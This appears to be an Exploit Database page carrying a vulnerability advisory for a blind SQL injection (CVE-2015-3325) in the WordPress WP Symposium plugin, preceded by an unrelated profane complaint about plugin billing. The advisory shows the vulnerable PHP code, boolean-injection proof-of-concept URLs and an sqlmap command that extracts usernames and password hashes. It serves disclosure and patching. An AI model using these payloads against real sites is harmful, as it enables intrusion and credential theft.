Plugin developers are an odd lot. They think it’s ok to sell a plugin and then not provide access to terms and condtions or a way to contact them about billing issues.
I bought this plugin and ended up deleting it and now I get a fucking NO REPLY email about auto renewal, telling me to go to my paypal account, which does not exist.
This plugin creates a huge load and really slows a websites load speeds down big time. And the conflicts!!! OYVEY!!!
Signed,
Hell in a Handbasket

=======================================================================

              title: SQL Injection
            product: WordPress WP Symposium Plugin
 vulnerable version: 15.1 (and probably below)
      fixed version: 15.4
         CVE number: CVE-2015-3325
             impact: CVSS Base Score 7.5 (AV:N/AC:L/Au:N/C:P/I:P/A:P)
           homepage: https://wordpress.org/plugins/wp-symposium/

Plugin description:
-------------------
"WP Symposium turns a WordPress website into a Social Network! It is a WordPress
plugin that provides a forum, activity (similar to Facebook wall), member
directory, private mail, notification panel, chat windows, profile page, social
widgets, activity alerts, RSS activity feeds, Groups, Events, Gallery, Facebook
Connect and Mobile support! You simply choose which you want to activate!
Certain features are optional to members to protect their privacy."

Source: https://wordpress.org/plugins/wp-symposium/

Recommendation:
---------------
The author has provided a fixed plugin version which should be installed
immediately.

Vulnerability overview/description:
-----------------------------------
Because of insufficient input validation, a blind sql injection attack can be
performed within the forum feature to obtain sensitive information from the
database. The vulnerable code sections are described below.

forum.php lines 59-62:
===============================================================================
if ( ( $topic_id == '' && $cat_id == '') || ( !$cat_id != '' && get_option(WPS_OPTIONS_PREFIX.'_forum_ajax') && !get_option(WPS_OPTIONS_PREFIX.'_permalink_structure') ) ) {
   $cat_id = isset($_GET['cid']) ? $_GET['cid'] : 0;
   $topic_id = isset($_GET['show']) ? $_GET['show'] : 0;  // GET PARAMETER IS ASSIGNED TO $topic_id VARIABLE
}
===============================================================================

forum.php lines 95-103:
===============================================================================
if ( get_option(WPS_OPTIONS_PREFIX.'_permalink_structure') || !get_option(WPS_OPTIONS_PREFIX.'_forum_ajax') ) {
   if ($topic_id == 0) {
      $forum = __wps__getForum($cat_id);
      if (($x = strpos($forum, '[|]')) !== FALSE) $forum = substr($forum, $x+3);
      $html .= $forum;
   } else {
      $html .= __wps__getTopic($topic_id);	// __wps__getTopic IS CALLED WITH $topic_id AS PARAMETER
   }
}
===============================================================================

functions.php lines 152-155:
===============================================================================
$post = $wpdb->get_row("
   SELECT tid, topic_subject, topic_approved, topic_category, topic_post, topic_started, display_name, topic_sticky, topic_owner, for_info
   FROM ".$wpdb->prefix."symposium_topics t INNER JOIN ".$wpdb->base_prefix."users u ON t.topic_owner = u.ID
   WHERE (t.topic_approved = 'on' OR t.topic_owner = ".$current_user->ID.") AND tid = ".$topic_id);   //UNVALIDATED $topic_id IS USED IN SQL QUERY
===============================================================================

Proof of concept:
-----------------
The following HTTP request to the forum page returns the topic with id 1:
===============================================================================
http://www.site.com/?page_id=4&cid=1&show=1 AND 1=1
===============================================================================

The following HTTP request to the forum page returns a blank page, thus
confirming the blind SQL injection vulnerability:
===============================================================================
http://www.site.com/?page_id=4&cid=1&show=1 AND 1=0
===============================================================================

Obtaining users and password hashes with sqlmap may look as follows:
================================================================================
sqlmap -u "http://www.site.com/?page_id=4&cid=1&show=1" -p "show" --technique=B --dbms=mysql --sql-query="select user_login,user_pass from wp_users"
================================================================================

Contact timeline:
------------------------
2015-04-08: Contacting author via mail.
2015-04-13: Mail from author, confirming the vulnerability.
2015-04-14: Requesting CVE via post to the open source software security mailing
            list: http://openwall.com/lists/oss-security/2015/04/14/5
2015-04-15: Mail from author, stating that updated plugin version will be
            available in the next few days.
2015-05-05: Mail from author, stating that fixed version has been uploaded and
            should be available soon.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
